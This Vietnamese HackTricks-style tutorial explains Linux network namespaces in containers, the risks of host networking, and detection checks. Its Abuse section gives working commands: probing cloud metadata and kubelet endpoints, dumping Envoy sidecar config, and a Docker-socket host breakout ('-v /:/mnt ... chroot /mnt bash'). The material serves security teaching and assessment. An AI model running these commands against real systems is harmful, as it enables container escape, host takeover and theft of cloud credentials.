# Namespace mạng

{{#include ../../../../../banners/hacktricks-training.md}}

## Tổng quan

Namespace mạng cô lập các tài nguyên liên quan đến mạng như giao diện mạng, địa chỉ IP, bảng định tuyến, trạng thái ARP/neighbor, quy tắc firewall, socket, namespace socket trừu tượng của UNIX-domain và nội dung của các tệp như `/proc/net`.<sup>[[2]](#references)</sup> Vì vậy, một container có thể có giao diện `eth0`, các tuyến cục bộ và thiết bị loopback riêng như thể chúng thuộc về nó, dù không sở hữu network stack thực của host.

Về mặt bảo mật, điều này quan trọng vì cô lập mạng không chỉ là kiểm soát việc bind cổng. Một network namespace riêng tư giới hạn những gì workload có thể trực tiếp quan sát hoặc cấu hình lại. Khi namespace đó được chia sẻ với host, container có thể bất ngờ nhìn thấy các listener của host, dịch vụ chỉ truy cập được từ host, endpoint AF_UNIX trừu tượng và các điểm kiểm soát mạng vốn không được thiết kế để ứng dụng truy cập.

## Hoạt động

Một network namespace mới được tạo sẽ có môi trường mạng trống hoặc gần như trống cho đến khi các giao diện được gắn vào. Sau đó, container runtime tạo hoặc kết nối các giao diện ảo, gán địa chỉ và cấu hình tuyến để workload có kết nối như mong đợi. Trong các triển khai dựa trên bridge, thường thì container thấy một giao diện được hỗ trợ bởi veth và kết nối với bridge của host. Trong Kubernetes, CNI plugin đảm nhiệm việc thiết lập tương đương cho mạng Pod.

Kiến trúc này giải thích vì sao `--network=host` hoặc `hostNetwork: true` tạo ra thay đổi lớn như vậy. Thay vì được cấp một network stack riêng đã chuẩn bị sẵn, workload tham gia vào network stack thực của host.

## Phòng lab

Bạn có thể xem một network namespace gần như trống bằng lệnh:

```bash
sudo unshare --net --fork bash
ip addr
ip route
```

Và bạn có thể so sánh các container thông thường với các container sử dụng mạng của host bằng cách:

```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```

Container sử dụng host network không còn có chế độ xem socket và interface riêng biệt, được cô lập. Chỉ riêng thay đổi này đã rất đáng kể, ngay cả trước khi xét đến các capability mà process có.

## Runtime Usage

Docker và Podman thường tạo một network namespace riêng cho mỗi container, trừ khi được cấu hình khác. Kubernetes thường cấp cho mỗi Pod một network namespace riêng, được các container bên trong Pod đó dùng chung nhưng tách biệt với host. Điều đó có nghĩa là `127.0.0.1` thường thuộc phạm vi Pod chứ không phải container: một listener chỉ bind vào localhost trong một container thường có thể được truy cập từ các sidecar và container cùng Pod. Hệ thống Incus/LXC cũng cung cấp khả năng cô lập dựa trên network namespace phong phú, thường hỗ trợ nhiều kiểu thiết lập mạng ảo hơn.

Nguyên tắc chung là mạng riêng tư mặc định tạo thành ranh giới cô lập, còn host networking là lựa chọn chủ động để bỏ qua ranh giới đó.

## Misconfigurations

Cấu hình sai quan trọng nhất đơn giản là dùng chung network namespace của host. Đôi khi việc này được thực hiện vì hiệu năng, giám sát cấp thấp hoặc sự tiện lợi, nhưng nó loại bỏ một trong những ranh giới cô lập rõ ràng nhất dành cho container. Các listener chỉ dành cho host trở nên dễ truy cập trực tiếp hơn, các dịch vụ chỉ bind vào localhost có thể truy cập được, và những capability như `CAP_NET_ADMIN` hoặc `CAP_NET_RAW` trở nên nguy hiểm hơn nhiều vì các thao tác mà chúng cho phép giờ được áp dụng lên chính môi trường mạng của host.

Một vấn đề khác là cấp quá nhiều network-related capability, ngay cả khi network namespace là riêng tư. Namespace riêng tư có giúp ích, nhưng không khiến raw socket hoặc các quyền kiểm soát mạng nâng cao trở nên vô hại.

Trong Kubernetes, `hostNetwork: true` cũng làm giảm mức độ tin cậy có thể đặt vào việc phân đoạn mạng ở cấp Pod. Kubernetes ghi nhận rằng nhiều network plugin không thể phân biệt chính xác lưu lượng của Pod dùng `hostNetwork` khi khớp `podSelector` / `namespaceSelector` và do đó xử lý lưu lượng này như lưu lượng thông thường của node.<sup>[[1]](#references)</sup> Từ góc nhìn của attacker, điều đó có nghĩa là thường nên xem workload dùng `hostNetwork` đã bị compromise như một điểm foothold mạng cấp node, thay vì như một Pod thông thường vẫn bị ràng buộc bởi các giả định chính sách tương tự workload dùng overlay network.

## Abuse

Trong các môi trường được cô lập yếu, attacker có thể kiểm tra các dịch vụ đang lắng nghe trên host, truy cập các endpoint quản lý chỉ bind vào loopback, sniff hoặc can thiệp vào lưu lượng tùy theo capability và môi trường cụ thể, hoặc cấu hình lại trạng thái định tuyến và firewall nếu có `CAP_NET_ADMIN`. Trong một cluster, điều này cũng có thể giúp lateral movement và trinh sát control plane dễ dàng hơn.

Nếu nghi ngờ có host networking, hãy bắt đầu bằng cách xác nhận rằng các interface và listener hiển thị thuộc về host chứ không phải mạng container được cô lập:

```bash
ip addr
ip route
ss -lntup | head -n 50
```

Các service chỉ lắng nghe trên loopback thường là phát hiện đáng chú ý đầu tiên:

```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```

Abstract UNIX socket cũng là một mục tiêu dễ bị bỏ sót vì chúng được giới hạn theo network namespace, dù không giống các listener TCP/UDP và có thể không tồn tại dưới dạng đường dẫn hệ thống tệp trong `/run`. Vì vậy, container dùng mạng của host có thể thừa hưởng quyền truy cập vào các kênh điều khiển chỉ dành cho host, dù các kênh đó chưa từng được bind-mount vào container:

```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```

Một ví dụ trong quá khứ là lỗi lộ abstract socket của `containerd-shim`, nhưng bài học rộng hơn quan trọng hơn CVE cụ thể: một khi workload tham gia network namespace của host, các dịch vụ abstract AF_UNIX cũng trở thành một phần của attack surface.<sup>[[3]](#references)</sup> Nếu các socket đó có vẻ liên quan đến runtime hoặc quản trị, hãy chuyển sang [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md).

Nếu có các network capability, hãy kiểm tra xem workload có thể kiểm tra hoặc thay đổi stack hiển thị hay không:

```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```

Trên các kernel hiện đại, dùng mạng của host cùng với `CAP_NET_ADMIN` cũng có thể mở rộng quyền truy cập vào luồng gói tin, vượt xa các thay đổi đơn giản với `iptables` / `nftables`. Các qdisc và bộ lọc `tc` cũng được giới hạn theo namespace, nên trong network namespace dùng chung với host, chúng áp dụng cho các giao diện mạng của host mà container có thể nhìn thấy. Nếu có thêm `CAP_BPF`, các chương trình eBPF liên quan đến mạng như trình nạp TC và XDP cũng trở nên đáng lưu ý:<sup>[[4]](#references)</sup>

```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
  echo "== $i =="
  tc qdisc show dev "$i" 2>/dev/null
  tc filter show dev "$i" ingress 2>/dev/null
  tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```

Điều này quan trọng vì kẻ tấn công có thể mirror, chuyển hướng, định hình hoặc loại bỏ traffic ở cấp giao diện host, chứ không chỉ sửa các firewall rule. Trong private network namespace, các hành động đó chỉ ảnh hưởng đến góc nhìn của container; trong shared host namespace, chúng có thể ảnh hưởng đến host.

Trong môi trường cluster hoặc cloud, host networking cũng là lý do để nhanh chóng recon cục bộ các dịch vụ metadata và dịch vụ nằm gần control plane:

```bash
for u in \
  http://169.254.169.254/latest/meta-data/ \
  http://100.100.100.200/latest/meta-data/ \
  http://127.0.0.1:10250/pods; do
  curl -m 2 -s "$u" 2>/dev/null | head
done
```

Trong Kubernetes, hãy nhớ rằng việc xâm nhập **bất kỳ** container nào trong Pod có nhiều container cũng cho phép truy cập các listener trên localhost do các container ngang hàng và sidecar mở, vì toàn bộ Pod dùng chung một network namespace. Điều này đặc biệt đáng lưu ý với service mesh, observability và các container hỗ trợ có giao diện quản trị hoặc debug được thiết kế để chỉ truy cập nội bộ trong Pod, thay vì trên toàn cluster:

```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```

Hãy xem “bound to localhost” là **riêng tư trong Pod**, không phải **riêng tư trong container**. Sau khi một container trong Pod bị xâm nhập, giả định đó không còn đúng.

### Ví dụ đầy đủ: Host networking + truy cập runtime cục bộ / Kubelet

Host networking không tự động cấp quyền root trên host, nhưng thường làm lộ các dịch vụ vốn chỉ được phép truy cập từ chính node đó. Nếu một trong các dịch vụ này được bảo vệ kém, host networking trở thành một đường dẫn leo thang đặc quyền trực tiếp.

Docker API trên localhost:

```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```

Kubelet trên localhost:

```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```

Tác động:

- xâm phạm trực tiếp host nếu API runtime cục bộ bị lộ mà không được bảo vệ đúng cách
- do thám cluster hoặc di chuyển ngang nếu có thể truy cập kubelet hoặc các agent cục bộ
- thao túng lưu lượng hoặc từ chối dịch vụ khi kết hợp với `CAP_NET_ADMIN`

## Checks

Mục tiêu của các bước kiểm tra này là xác định liệu process có network stack riêng hay không, những route và listener nào có thể nhìn thấy, cũng như liệu góc nhìn về mạng đã giống với host trước cả khi bạn kiểm tra các capability hay chưa.

```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```

Điều gì đáng chú ý ở đây:

- Nếu `/proc/self/ns/net` và `/proc/1/ns/net` trông giống namespace của host, container có thể đang dùng chung network namespace của host hoặc một namespace không riêng tư khác.
- `lsns -t net` và `ip netns identify` rất hữu ích khi shell đã ở bên trong một namespace có tên hoặc namespace persistent và bạn muốn đối chiếu nó với các đối tượng trong `/run/netns` từ phía host.
- `ss -lntup` đặc biệt hữu ích vì nó cho thấy các listener chỉ bind trên loopback và các endpoint quản lý cục bộ. `ss -xap` và `/proc/net/unix` bổ sung góc nhìn về abstract socket mà các cuộc tìm kiếm socket thông thường trên filesystem sẽ bỏ sót.
- Route, tên interface, ngữ cảnh firewall, trạng thái `tc` và các eBPF attachment trở nên quan trọng hơn nhiều nếu có `CAP_NET_ADMIN`, `CAP_NET_RAW` hoặc `CAP_BPF`.
- Trong Kubernetes, việc phân giải tên service thất bại từ một Pod `hostNetwork` có thể chỉ đơn giản là do Pod không dùng `dnsPolicy: ClusterFirstWithHostNet`, chứ không phải service không tồn tại.
- Trong các Pod nhiều container, listener trên localhost thuộc về toàn bộ network namespace của Pod; vì vậy, hãy kiểm tra sidecar và các container cùng Pod trước khi cho rằng một cổng chỉ bind trên loopback không thể truy cập từ container bị xâm nhập.

Khi đánh giá một container, hãy luôn xem xét network namespace cùng với tập capability. Dùng host networking và có network capability mạnh tạo ra tư thế bảo mật rất khác so với dùng bridge networking và tập capability mặc định hạn chế.

## References

- [1] [Các lưu ý về Kubernetes NetworkPolicy và `hostNetwork`](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [2] [Linux `network_namespaces(7)` và tính cô lập của abstract UNIX socket](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [3] [Thông báo bảo mật của containerd: abstract Unix domain socket bị lộ cho container dùng host network](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [4] [Yêu cầu về eBPF token và capability đối với các chương trình eBPF liên quan đến network](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
